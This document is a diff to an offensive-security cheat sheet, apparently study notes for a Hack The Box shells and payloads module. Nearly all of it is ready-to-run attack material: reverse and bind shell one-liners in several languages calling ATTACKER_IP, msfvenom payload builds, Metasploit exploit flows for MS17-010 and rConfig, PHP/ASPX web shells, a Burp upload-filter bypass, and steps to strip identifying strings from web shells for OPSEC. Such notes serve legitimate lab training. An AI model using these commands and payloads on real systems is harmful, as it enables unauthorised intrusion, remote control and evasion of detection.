@@ -68,8 +68,11 @@ A shell is a program that provides a user interface to the operating system. In 
 The target opens a port and attaches a shell to it. The attacker connects to that port. The target becomes the server, the attacker becomes the client.
 
 ```bash
-Target:   nc -lvnp 4444 -e /bin/bash
-Attacker: nc -nv TARGET_IP 4444
+# TARGET runs:
+nc -lvnp 4444 -e /bin/bash
+
+# ATTACKER connects:
+Hackerpatel007_1@htb[/htb]$ nc -nv TARGET_IP 4444
 ```
 
 **When to use bind shells:**
@@ -81,38 +84,38 @@ Attacker: nc -nv TARGET_IP 4444
 
 ### Bind Shell Commands
 
-**Linux — FIFO (OpenBSD Netcat, no -e flag):**
+**Linux — FIFO (OpenBSD Netcat, no -e flag) — run on TARGET:**
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f
 ```
 
-**Linux — GNU Netcat (-e flag available):**
+**Linux — GNU Netcat (-e flag available) — run on TARGET:**
 ```bash
 nc -lvnp 4444 -e /bin/bash
 ```
 
 **Socat — full TTY instantly (best quality):**
 ```bash
-# Target
+# TARGET runs:
 socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 
-# Attacker connects
-socat - TCP:TARGET_IP:4444
+# ATTACKER connects:
+Hackerpatel007_1@htb[/htb]$ socat - TCP:TARGET_IP:4444
 ```
 
-**Python 3:**
+**Python 3 — run on TARGET:**
 ```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 ```
 
-**PowerShell (Windows Bind):**
+**PowerShell Bind — run on TARGET (Windows):**
 ```powershell
 powershell -nop -c "$listener = [System.Net.Sockets.TcpListener]4444;$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
 ```
 
-**Attacker connects (all bind shell types):**
+**Attacker connects to any bind shell:**
 ```bash
-nc -nv TARGET_IP 4444
+Hackerpatel007_1@htb[/htb]$ nc -nv TARGET_IP 4444
 ```
 
 ---
@@ -122,8 +125,11 @@ nc -nv TARGET_IP 4444
 The attacker sets up a listener first. The target executes a payload that calls back to that listener. Bypasses inbound firewall restrictions because the target initiates an outbound connection — organisations must allow outbound for users to browse the internet.
 
 ```bash
-Attacker: nc -lvnp 443
-Target:   bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+# ATTACKER listens:
+Hackerpatel007_1@htb[/htb]$ nc -lvnp 443
+
+# TARGET executes:
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
 ```
 
 **Port selection strategy:**
@@ -136,7 +142,7 @@ Target:   bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
 | 8080 | Alt HTTP — common in enterprise |
 | 4444 | Avoid in real engagements — known Meterpreter default |
 
-### Reverse Shell Commands
+### Reverse Shell One-Liners — Run on TARGET
 
 **Bash:**
 ```bash
@@ -178,38 +184,38 @@ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
-**PowerShell (Windows):**
+**PowerShell — run on TARGET (Windows):**
 ```powershell
 powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 **Socat — full TTY reverse shell (best quality):**
 ```bash
-# Attacker listener
-socat file:`tty`,raw,echo=0 TCP-LISTEN:443
+# ATTACKER listener:
+Hackerpatel007_1@htb[/htb]$ socat file:`tty`,raw,echo=0 TCP-LISTEN:443
 
-# Target connects back
+# TARGET connects back:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:443
 ```
 
-**Standard Netcat listener:**
+**Standard Netcat listener — run on ATTACKER (Kali):**
 ```bash
-sudo nc -lvnp 443
+Hackerpatel007_1@htb[/htb]$ sudo nc -lvnp 443
 ```
 
 ### TTY Stabilisation — Run Immediately After Catching Shell
 
 ```bash
-# Step 1 — Spawn PTY
+# Step 1 — Spawn PTY (run on target shell)
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # Step 2 — Background the shell
 CTRL+Z
 
-# Step 3 — Fix local terminal settings
-stty raw -echo; fg
+# Step 3 — Fix local terminal settings (run on Kali)
+Hackerpatel007_1@htb[/htb]$ stty raw -echo; fg
 
-# Step 4 — Set terminal environment variables
+# Step 4 — Set terminal environment variables (run on target shell)
 export TERM=xterm
 export SHELL=bash
 stty rows 38 columns 116
@@ -236,15 +242,15 @@ Layer 3 — OS Kernel
 
 ### Shell Identification Commands
 
-**Linux:**
+**Linux — run on Kali:**
 ```bash
-echo $0          # Current shell name
-ps               # Shows shell process
-env | grep SHELL # Configured login shell
-cat /etc/shells  # All available shells
+Hackerpatel007_1@htb[/htb]$ echo $0          # Current shell name
+Hackerpatel007_1@htb[/htb]$ ps               # Shows shell process
+Hackerpatel007_1@htb[/htb]$ env | grep SHELL # Configured login shell
+Hackerpatel007_1@htb[/htb]$ cat /etc/shells  # All available shells
 ```
 
-**Windows:**
+**Windows — run on target:**
 ```powershell
 $PSVersionTable    # PowerShell version and edition
 echo %COMSPEC%     # CMD interpreter path
@@ -324,7 +330,7 @@ windows/x64/meterpreter_reverse_tcp
 ### Core MSFConsole Workflow
 
 ```bash
-sudo msfconsole -q
+Hackerpatel007_1@htb[/htb]$ sudo msfconsole -q
 
 msf6 > search type:exploit platform:windows smb ms17-010
 msf6 > use exploit/windows/smb/ms17_010_psexec
@@ -338,66 +344,66 @@ msf6 > exploit
 ### Meterpreter Core Commands
 
 ```
-getuid              # Current user context
-sysinfo             # Target OS and hostname
-getpid              # Current process PID
-ps                  # List all processes
-migrate 1234        # Migrate to process PID 1234
-shell               # Drop into native OS shell
-hashdump            # Dump local SAM hashes
-upload src dst      # Upload file to target
-download src dst    # Download file from target
-search -f name      # Search for file on target
-background          # Send session to background
-sessions -l         # List all active sessions
-sessions -i 1       # Interact with session 1
+meterpreter > getuid              # Current user context
+meterpreter > sysinfo             # Target OS and hostname
+meterpreter > getpid              # Current process PID
+meterpreter > ps                  # List all processes
+meterpreter > migrate 1234        # Migrate to process PID 1234
+meterpreter > shell               # Drop into native OS shell
+meterpreter > hashdump            # Dump local SAM hashes
+meterpreter > upload src dst      # Upload file to target
+meterpreter > download src dst    # Download file from target
+meterpreter > search -f name      # Search for file on target
+meterpreter > background          # Send session to background
+msf6 > sessions -l                # List all active sessions
+msf6 > sessions -i 1              # Interact with session 1
 ```
 
 ### MSFVenom Payload Generation
 
 ```bash
 # List available payloads
-msfvenom -l payloads | grep windows
-msfvenom -l formats
+Hackerpatel007_1@htb[/htb]$ msfvenom -l payloads | grep windows
+Hackerpatel007_1@htb[/htb]$ msfvenom -l formats
 
 # Windows EXE — staged (requires multi/handler)
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe
+Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe
 
 # Windows EXE — stageless (catchable by nc)
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe
+Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe
 
 # Windows HTTPS — bypasses DPI
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o shell.exe
+Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o shell.exe
 
 # Linux ELF — staged
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f elf -o shell.elf
+Hackerpatel007_1@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f elf -o shell.elf
 
 # Linux ELF — stageless (catchable by nc)
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f elf -o shell.elf
+Hackerpatel007_1@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f elf -o shell.elf
 
 # PHP web shell
-msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=443 -f raw -o shell.php
+Hackerpatel007_1@htb[/htb]$ msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=443 -f raw -o shell.php
 
 # ASPX web shell (IIS)
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f aspx -o shell.aspx
+Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f aspx -o shell.aspx
 
 # JSP web shell (Tomcat)
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=443 -f war -o shell.war
+Hackerpatel007_1@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=443 -f war -o shell.war
 
 # MSI payload (AlwaysInstallElevated privilege escalation)
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f msi -o shell.msi
+Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f msi -o shell.msi
 
 # Raw shellcode for custom loaders (C format)
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f c
+Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f c
 
 # Make ELF executable after generating
-chmod +x shell.elf
+Hackerpatel007_1@htb[/htb]$ chmod +x shell.elf
 ```
 
 ### Multi/Handler Setup
 
 ```bash
-msfconsole -q
+Hackerpatel007_1@htb[/htb]$ sudo msfconsole -q
 msf6 > use exploit/multi/handler
 msf6 > set payload windows/x64/meterpreter/reverse_tcp
 msf6 > set LHOST tun0
@@ -413,13 +419,13 @@ msf6 > exploit -j   # -j runs as background job
 
 ```bash
 # TTL-based OS detection (TTL ~128 = Windows, ~64 = Linux)
-ping -c 1 TARGET
+Hackerpatel007_1@htb[/htb]$ ping -c 1 TARGET
 
 # Nmap OS and version detection
-sudo nmap -v -A -Pn TARGET
+Hackerpatel007_1@htb[/htb]$ sudo nmap -v -A -Pn TARGET
 
 # SMB OS discovery
-nmap -p 445 --script smb-os-discovery TARGET
+Hackerpatel007_1@htb[/htb]$ nmap -p 445 --script smb-os-discovery TARGET
 ```
 
 ### Notable Windows Vulnerabilities
@@ -436,12 +442,13 @@ nmap -p 445 --script smb-os-discovery TARGET
 
 ```bash
 # Step 1 — Scan for vulnerability
-use auxiliary/scanner/smb/smb_ms17_010
+Hackerpatel007_1@htb[/htb]$ sudo msfconsole -q
+msf6 > use auxiliary/scanner/smb/smb_ms17_010
 msf6 > set RHOSTS TARGET_IP
 msf6 > run
 
 # Step 2 — Exploit
-use exploit/windows/smb/ms17_010_psexec
+msf6 > use exploit/windows/smb/ms17_010_psexec
 msf6 > set RHOSTS TARGET_IP
 msf6 > set LHOST tun0
 msf6 > set LPORT 443
@@ -454,6 +461,7 @@ meterpreter > getuid
 
 ### File Transfer to Windows
 
+**Run on TARGET (Windows):**
 ```powershell
 # PowerShell download
 powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP:8080/file.exe','C:\Windows\Temp\file.exe')"
@@ -462,13 +470,13 @@ powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP:8080/file.exe'
 certutil -urlcache -split -f http://IP:8080/file.exe C:\Windows\Temp\file.exe
 ```
 
+**Run on ATTACKER (Kali) — host the file:**
 ```bash
-# Impacket SMB server on Kali
-impacket-smbserver share /path/to/files -smb2support
+Hackerpatel007_1@htb[/htb]$ impacket-smbserver share /path/to/files -smb2support
 ```
 
+**Run on TARGET — pull from SMB share:**
 ```cmd
-# Copy from SMB share on target
 copy \\ATTACKER_IP\share\file.exe C:\Windows\Temp\file.exe
 ```
 
@@ -499,13 +507,13 @@ where /r C:\ proof.txt
 
 ```bash
 # TTL detection (TTL ~64 = Linux)
-ping -c 1 TARGET
+Hackerpatel007_1@htb[/htb]$ ping -c 1 TARGET
 
 # Full enumeration
-nmap -sC -sV TARGET
-nmap -v -A -Pn TARGET
+Hackerpatel007_1@htb[/htb]$ nmap -sC -sV TARGET
+Hackerpatel007_1@htb[/htb]$ nmap -v -A -Pn TARGET
 
-# Distribution identification (from shell)
+# Distribution identification (from target shell)
 cat /etc/os-release
 uname -a
 cat /etc/issue
@@ -523,7 +531,8 @@ cat /etc/issue
 ### rConfig 3.9.6 Exploit Flow
 
 ```bash
-use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+Hackerpatel007_1@htb[/htb]$ sudo msfconsole -q
+msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
 msf6 > set RHOSTS TARGET_IP
 msf6 > set RPORT 443
 msf6 > set SSL true
@@ -569,7 +578,7 @@ Web-based and service-based exploitation often lands a non-TTY shell. This break
 which python python3 perl ruby php lua node awk vim find script socat 2>/dev/null
 ```
 
-### Shell Spawning Methods — Try in This Order
+### Shell Spawning Methods — Try in This Order (run on TARGET shell)
 
 ```bash
 # Python 3 (most common — available on most modern Linux)
@@ -606,13 +615,16 @@ vim -c ':!/bin/bash'
 ### Full TTY Upgrade Sequence
 
 ```bash
-# 1 — Spawn PTY
+# 1 — Spawn PTY (on target shell)
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
 # 2 — Background the shell
 CTRL+Z
-# 3 — Fix local terminal
-stty raw -echo; fg
-# 4 — Configure terminal environment
+
+# 3 — Fix local terminal (on Kali)
+Hackerpatel007_1@htb[/htb]$ stty raw -echo; fg
+
+# 4 — Configure terminal environment (on target shell)
 export TERM=xterm
 export SHELL=bash
 stty rows 38 columns 116
@@ -673,19 +685,19 @@ A script file uploaded to a web server that provides remote code execution throu
 <?php system($_REQUEST['cmd']); ?>
 ```
 
-**Interact via curl:**
+**Interact via curl — run on Kali:**
 ```bash
 # GET request
-curl "http://TARGET/shell.php?cmd=whoami"
+Hackerpatel007_1@htb[/htb]$ curl "http://TARGET/shell.php?cmd=whoami"
 
 # POST request
-curl -X POST "http://TARGET/shell.php" -d "cmd=whoami"
+Hackerpatel007_1@htb[/htb]$ curl -X POST "http://TARGET/shell.php" -d "cmd=whoami"
 
 # HTTPS (ignore self-signed cert)
-curl -k "https://TARGET/shell.php?cmd=id"
+Hackerpatel007_1@htb[/htb]$ curl -k "https://TARGET/shell.php?cmd=id"
 
 # URL-encode command automatically
-curl --data-urlencode "cmd=ls -la /var/www/" http://TARGET/shell.php
+Hackerpatel007_1@htb[/htb]$ curl --data-urlencode "cmd=ls -la /var/www/" http://TARGET/shell.php
 ```
 
 ### ASPX Web Shell (IIS / Windows)
@@ -735,11 +747,11 @@ while((line = br.readLine()) != null) out.println(line);
 ### Upgrade Web Shell to Reverse Shell
 
 ```bash
-# Start listener first
-sudo nc -lvnp 443
+# Start listener first (Kali)
+Hackerpatel007_1@htb[/htb]$ sudo nc -lvnp 443
 
-# Linux target — trigger bash reverse shell through webshell
-curl --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'" http://TARGET/shell.php
+# Trigger reverse shell through web shell (Kali)
+Hackerpatel007_1@htb[/htb]$ curl --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'" http://TARGET/shell.php
 
 # Windows target — PowerShell one-liner through Antak/Laudanum interface
 # Send via browser or Burp to avoid URL encoding issues
@@ -758,31 +770,31 @@ A collection of ready-made injectable web shell files for multiple languages. Sh
 
 ```bash
 # Copy shell — never modify originals
-cp /usr/share/laudanum/aspx/shell.aspx ~/shells/report.aspx
-cp /usr/share/laudanum/php/shell.php ~/shells/image.php
+Hackerpatel007_1@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx ~/shells/report.aspx
+Hackerpatel007_1@htb[/htb]$ cp /usr/share/laudanum/php/shell.php ~/shells/image.php
 
 # Get your VPN IP
-MYIP=$(ip a show tun0 | grep inet | awk '{print $2}' | cut -d/ -f1)
+Hackerpatel007_1@htb[/htb]$ MYIP=$(ip a show tun0 | grep inet | awk '{print $2}' | cut -d/ -f1)
 
 # Set IP allowlist in the shell
-sed -i "s/127.0.0.1/$MYIP/g" ~/shells/report.aspx
+Hackerpatel007_1@htb[/htb]$ sed -i "s/127.0.0.1/$MYIP/g" ~/shells/report.aspx
 
 # Remove identifying comments (OPSEC)
-sed -i '/^[[:space:]]*\/\//d' ~/shells/report.aspx
-sed -i '/^[[:space:]]*$/d' ~/shells/report.aspx
+Hackerpatel007_1@htb[/htb]$ sed -i '/^[[:space:]]*\/\//d' ~/shells/report.aspx
+Hackerpatel007_1@htb[/htb]$ sed -i '/^[[:space:]]*$/d' ~/shells/report.aspx
 
 # Verify no identifying strings remain
-grep -i "laudanum\|author\|version" ~/shells/report.aspx
+Hackerpatel007_1@htb[/htb]$ grep -i "laudanum\|author\|version" ~/shells/report.aspx
 ```
 
 ### /etc/hosts Entry for Lab Targets
 
 ```bash
 # Add target
-echo "TARGET_IP status.inlanefreight.local" | sudo tee -a /etc/hosts
+Hackerpatel007_1@htb[/htb]$ echo "TARGET_IP status.inlanefreight.local" | sudo tee -a /etc/hosts
 
 # Remove when done
-sudo sed -i '/inlanefreight/d' /etc/hosts
+Hackerpatel007_1@htb[/htb]$ sudo sed -i '/inlanefreight/d' /etc/hosts
 ```
 
 ---
@@ -804,23 +816,23 @@ A PowerShell-native ASPX web shell from the Nishang offensive PowerShell project
 
 ```bash
 # Copy shell
-cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/shells/Upload.aspx
+Hackerpatel007_1@htb[/htb]$ cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/shells/Upload.aspx
 
 # Set credentials (line 14)
-sed -i 's/YOURUSERNAME/sysadmin/' ~/shells/Upload.aspx
-sed -i 's/YOURPASSWORD/P@ssw0rd123!/' ~/shells/Upload.aspx
+Hackerpatel007_1@htb[/htb]$ sed -i 's/YOURUSERNAME/sysadmin/' ~/shells/Upload.aspx
+Hackerpatel007_1@htb[/htb]$ sed -i 's/YOURPASSWORD/P@ssw0rd123!/' ~/shells/Upload.aspx
 
 # Remove identifying comments
-sed -i '/^[[:space:]]*\/\//d' ~/shells/Upload.aspx
+Hackerpatel007_1@htb[/htb]$ sed -i '/^[[:space:]]*\/\//d' ~/shells/Upload.aspx
 
 # Verify credentials are set
-sed -n '14,16p' ~/shells/Upload.aspx
+Hackerpatel007_1@htb[/htb]$ sed -n '14,16p' ~/shells/Upload.aspx
 
 # Verify no identifying strings remain
-grep -i "nishang\|antak\|author" ~/shells/Upload.aspx
+Hackerpatel007_1@htb[/htb]$ grep -i "nishang\|antak\|author" ~/shells/Upload.aspx
 ```
 
-### Key PowerShell Commands Through Antak
+### Key PowerShell Commands Through Antak (run in Antak browser interface)
 
 ```powershell
 # Immediate enumeration
@@ -853,12 +865,12 @@ Some upload mechanisms validate file type using the client-supplied Content-Type
 ### Burp Suite Bypass Workflow
 
 ```
-1. Start Burp:            burpsuite &
-2. Configure browser proxy: 127.0.0.1:8080
-3. Enable Intercept:      Proxy → Intercept → ON
+1. Start Burp:              burpsuite &
+2. Configure browser proxy:  127.0.0.1:8080
+3. Enable Intercept:         Proxy → Intercept → ON
 4. Upload PHP shell via file upload form
-5. In Burp request:       Find Content-Type: application/x-php
-6. Change to:             Content-Type: image/gif
+5. In Burp request:          Find Content-Type: application/x-php
+6. Change to:                Content-Type: image/gif
 7. Click Forward
 8. Disable Intercept
 9. Access uploaded file at the known upload path
@@ -883,29 +895,29 @@ eval()       // Execute arbitrary PHP code
 
 ```bash
 # 1 — Get VPN IP
-ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1
+Hackerpatel007_1@htb[/htb]$ ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1
 
 # 2 — Prepare shells directory
-mkdir -p ~/shells
+Hackerpatel007_1@htb[/htb]$ mkdir -p ~/shells
 
 # 3 — Prepare privesc tools
-mkdir -p /opt/privesc && cd /opt/privesc
-wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
-wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
-wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-chmod +x linpeas.sh LinEnum.sh
+Hackerpatel007_1@htb[/htb]$ mkdir -p /opt/privesc && cd /opt/privesc
+Hackerpatel007_1@htb[/htb]$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+Hackerpatel007_1@htb[/htb]$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
+Hackerpatel007_1@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+Hackerpatel007_1@htb[/htb]$ chmod +x linpeas.sh LinEnum.sh
 
 # 4 — Prepare Laudanum shells with IP set
-MYIP=$(ip a show tun0 | grep inet | awk '{print $2}' | cut -d/ -f1)
-cp /usr/share/laudanum/aspx/shell.aspx ~/shells/report.aspx
-cp /usr/share/laudanum/php/shell.php ~/shells/image.php
-sed -i "s/127.0.0.1/$MYIP/g" ~/shells/report.aspx
-sed -i "s/127.0.0.1/$MYIP/g" ~/shells/image.php
+Hackerpatel007_1@htb[/htb]$ MYIP=$(ip a show tun0 | grep inet | awk '{print $2}' | cut -d/ -f1)
+Hackerpatel007_1@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx ~/shells/report.aspx
+Hackerpatel007_1@htb[/htb]$ cp /usr/share/laudanum/php/shell.php ~/shells/image.php
+Hackerpatel007_1@htb[/htb]$ sed -i "s/127.0.0.1/$MYIP/g" ~/shells/report.aspx
+Hackerpatel007_1@htb[/htb]$ sed -i "s/127.0.0.1/$MYIP/g" ~/shells/image.php
 
 # 5 — Prepare Antak
-cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/shells/Upload.aspx
-sed -i 's/YOURUSERNAME/sysadmin/' ~/shells/Upload.aspx
-sed -i 's/YOURPASSWORD/P@ssw0rd123!/' ~/shells/Upload.aspx
+Hackerpatel007_1@htb[/htb]$ cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/shells/Upload.aspx
+Hackerpatel007_1@htb[/htb]$ sed -i 's/YOURUSERNAME/sysadmin/' ~/shells/Upload.aspx
+Hackerpatel007_1@htb[/htb]$ sed -i 's/YOURPASSWORD/P@ssw0rd123!/' ~/shells/Upload.aspx
 ```
 
 ---
@@ -913,11 +925,11 @@ sed -i 's/YOURPASSWORD/P@ssw0rd123!/' ~/shells/Upload.aspx
 ## Web Shell Decision Guide
 
 ```
-PHP server  (Linux/Apache)  → Laudanum PHP or minimal one-liner
-ASPX server (Windows/IIS)   → Antak for full PowerShell features
-                              Laudanum ASPX for basic commands
-JSP server  (Tomcat)        → msfvenom WAR if Tomcat manager is accessible
-                              Laudanum JSP for direct file upload
+PHP server  (Linux/Apache)    → Laudanum PHP or minimal one-liner
+ASPX server (Windows/IIS)     → Antak for full PowerShell features
+                                Laudanum ASPX for basic commands
+JSP server  (Tomcat)          → msfvenom WAR if Tomcat manager is accessible
+                                Laudanum JSP for direct file upload
 Any server (need Meterpreter) → msfvenom matching target platform/format
 ```
 
@@ -926,36 +938,40 @@ Any server (need Meterpreter) → msfvenom matching target platform/format
 ## Shell Cleanup After Each Engagement
 
 ```bash
-# Delete web shell (Linux)
+# Delete web shell (Linux target — run from target shell)
 rm -f /var/www/html/uploads/image.php
 
-# Delete web shell (Windows — from cmd.exe)
+# Delete web shell (Windows target — from cmd.exe on target)
 del C:\inetpub\wwwroot\files\report.aspx
 
-# Verify deletion (404 = gone)
-curl -s -o /dev/null -w "%{http_code}" http://TARGET/uploads/image.php
+# Verify deletion from Kali (404 = gone)
+Hackerpatel007_1@htb[/htb]$ curl -s -o /dev/null -w "%{http_code}" http://TARGET/uploads/image.php
 
-# Remove /etc/hosts entries
-sudo sed -i '/inlanefreight/d' /etc/hosts
+# Remove /etc/hosts entries (Kali)
+Hackerpatel007_1@htb[/htb]$ sudo sed -i '/inlanefreight/d' /etc/hosts
 
 # Document all deployed artifacts
-echo "Shell: image.php | Path: /var/www/html/uploads/ | Deleted: $(date)" >> ~/engagement_log.txt
+Hackerpatel007_1@htb[/htb]$ echo "Shell: image.php | Path: /var/www/html/uploads/ | Deleted: $(date)" >> ~/engagement_log.txt
 ```
 
 ---
 
 ## Flag Locations Quick Reference
 
+**Linux — run from target shell:**
 ```bash
-# Linux — search entire filesystem
 find / -name "proof.txt" -o -name "root.txt" -o -name "user.txt" -o -name "local.txt" 2>/dev/null
+```
 
-# Windows CMD
+**Windows CMD — run from target shell:**
+```cmd
 where /r C:\ proof.txt
 where /r C:\ root.txt
 where /r C:\ user.txt
+```
 
-# Windows PowerShell
+**Windows PowerShell — run from target shell:**
+```powershell
 Get-ChildItem -Path C:\ -Recurse -Include "proof.txt","root.txt","user.txt" -EA SilentlyContinue
 ```
 
